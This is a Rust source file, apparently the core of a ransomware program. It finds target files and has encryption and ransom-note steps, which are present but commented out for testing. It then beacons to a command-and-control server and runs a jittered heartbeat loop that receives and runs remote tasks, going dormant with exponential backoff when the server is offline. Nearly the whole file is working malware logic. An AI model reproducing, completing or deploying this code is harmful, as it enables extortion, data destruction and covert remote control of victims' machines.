use rand::Rng;
use std::io::{self, Write};
use local_ip_address::local_ip;
use std::sync::Arc;
use tokio::sync::{Mutex, mpsc};


use crate::core::agent_state::AgentState;
use crate::utils::{logger, note, config::AppConfig};
use crate::core::targeting;
use crate::post::{
    command_handler,
    commands::{AgentCommand, ResultQueue}
};
use crate::crypto::encryption;
use crate::communication::beacon;



pub async fn ransom(logger: Arc<logger::Logger>, config: &AppConfig) -> Result<(), Box<dyn std::error::Error>> {
    logger.init_file_logging(&config.log_path)?; // Change later
    
    let local_ip = local_ip()?;
    logger.log(&format!("Ransomware Program starting on local IP: {}", local_ip));

    // Step 1: Locate files of interest, set path to search
    let targets = targeting::discover_files(&logger, &config.target_path)?;

    dbg!(&targets);
    // // Ask user if wants to continue: only for testing purposes, remove later
    // if !ask_user_confirmation() {
    //     logger.log("User chose not to continue. Exiting...");
    //     return Ok(());
    // }

    // // Step 2: Encrypt files
    // match encryption::encrypt(targets, &logger, &config.extension, &config.key_path) {
    //     Ok(_) => {},
    //     Err(e) => logger.log(&format!("Error during encryption: {}", e)),
    // }

    // // Step 3: Display ransom note with instructions, place on Desktop (TODO)
    // let _ = note::generate_note(&logger, &config.note_path);


    // Step 4: Send initial beacon to C2
    let result_queue: ResultQueue = Arc::new(Mutex::new(None));
    let (agent_id, session_id) = beacon::initial_beacon(
        &config.server_address, 
        config.retries, 
        config.timeout_seconds,
        &logger).await;

    
    let offline = agent_id == 0;

    // Create a channel for commands
    let (tx, rx) = mpsc::channel::<AgentCommand>(32);
    // Start worker
    tokio::spawn(command_handler::run_command_worker(rx, Arc::clone(&result_queue)));

    
    let mut agent_state = AgentState {
        agent_id,
        session_id,
        offline,
        logger: Arc::clone(&logger),
        result_queue,
        tx,
        heartbeat_handle: None
    };
    
    // Run heartbeat loop forever. If no response from server, switch to offline mode until reconnected
    loop {
        if !agent_state.offline {
            if agent_state.heartbeat_handle.is_none() {
                // Only spawn if not already running
                agent_state.heartbeat_handle = Some(agent_state.start_heartbeat(config));
            }
        
            // Check if the task is done
            if let Some(handle) = agent_state.heartbeat_handle.take() {
                match handle.await {
                    Ok(Ok(())) => {} // still good
                    Ok(Err(e)) => {
                        logger.log(&format!("Heartbeat error: {e}"));
                        agent_state.offline = true;
                    }
                    Err(e) => {
                        logger.log(&format!("Task panic: {e}"));
                        agent_state.offline = true;
                    }
                }
            }
        } else {
            agent_state.offline_mode(config).await;
            agent_state.offline = false;
        }
    }

    Ok(())
}

/// Spawns a Tokio task that periodically sends a heartbeat to the C2 server.
    /// 
    /// The task runs an infinite loop where it:
    /// - Waits for a randomized interval (60 seconds plus up to 20 seconds jitter).
    /// - Retrieves results from a shared queue.
    /// - Sends a heartbeat request to the C2 server, including any results.
    /// - If the server responds with tasks, forwards them to a channel for processing.
    /// 
    /// This mechanism allows the agent to regularly check in with the C2 server,
    /// report results, and receive new tasks asynchronously.
async fn _heartbeat(
    logger: Arc<logger::Logger>, config: &AppConfig, 
    agent_id: u64, session_id: String, result_queue: &ResultQueue,
    tx: &mpsc::Sender<AgentCommand>) 
    -> Result<(), Box<dyn std::error::Error + Send + Sync>> {

    let server_address = config.server_address.clone();
    let timeout_secs = config.timeout_seconds;

    let tx = tx.clone();
    let result_queue = Arc::clone(&result_queue);
    let logger: Arc<logger::Logger> = Arc::clone(&logger);
    
    let heartbeat_handle = tokio::spawn(async move {
        loop {
            let jitter = rand::thread_rng().gen_range(0..20);
            tokio::time::sleep(std::time::Duration::from_secs(60 + jitter)).await;

            // Get results from queue
            let results = result_queue.lock().await.take();
            // Send heartbeat to C2 to requests tasks
            match beacon::heartbeat(
                &server_address,
                agent_id,
                &session_id,
                timeout_secs,
                results,
                &*logger
            ).await {
                Some(msgs) => {
                    // If tasks exist, complete them and store results somewhere
                    // Send results on next heartbeat
                    for msg in msgs {
                        let _ = tx.send(msg).await;
                    }
                }
                None => {
                    // Failed to send connect/send message to C2 -> switch back to offline mode
                    return Err("C2 heartbeat failed.".into());
                }
            }

        }
    });

    match heartbeat_handle.await {
        Ok(Ok(())) => Ok(()), // All good
        Ok(Err(e)) => Err(e), // Heartbeat task reported an error (e.g., C2 lost)
        Err(join_err) => Err(format!("Heartbeat task panicked: {join_err}").into()), // Tokio join error
    }


}

async fn _offline_mode(logger: &logger::Logger, config: &AppConfig) -> (u64, String) {
    // If operating in offline mode, check every X
    let mut interval_secs = 60; // Start with 1 min
    let max_interval = 86400; // set cap at 24 hr 
    
    loop {
        logger.log(&format!("C2 unreachable. Entering dormant mode. Retrying in {} seconds.", interval_secs));
        tokio::time::sleep(std::time::Duration::from_secs(interval_secs)).await;

        let (new_agent_id, session_id) = beacon::initial_beacon(
            &config.server_address, 
            config.retries, 
            config.timeout_seconds,
            &logger).await;

        if new_agent_id != 0 {
            logger.log("Reconnected to C2. Exiting offline mode.");
            return (new_agent_id, session_id);
        }

        // Back off retry interval (capped)
        interval_secs = std::cmp::min(interval_secs * 2, max_interval);
    }
}

fn ask_user_confirmation() -> bool {
    print!("Do you want to begin encrypting? (y/n): ");
    io::stdout().flush().unwrap();

    let mut input = String::new();
    io::stdin().read_line(&mut input).unwrap();
    matches!(input.trim().to_lowercase().as_str(), "y" | "yes")
}

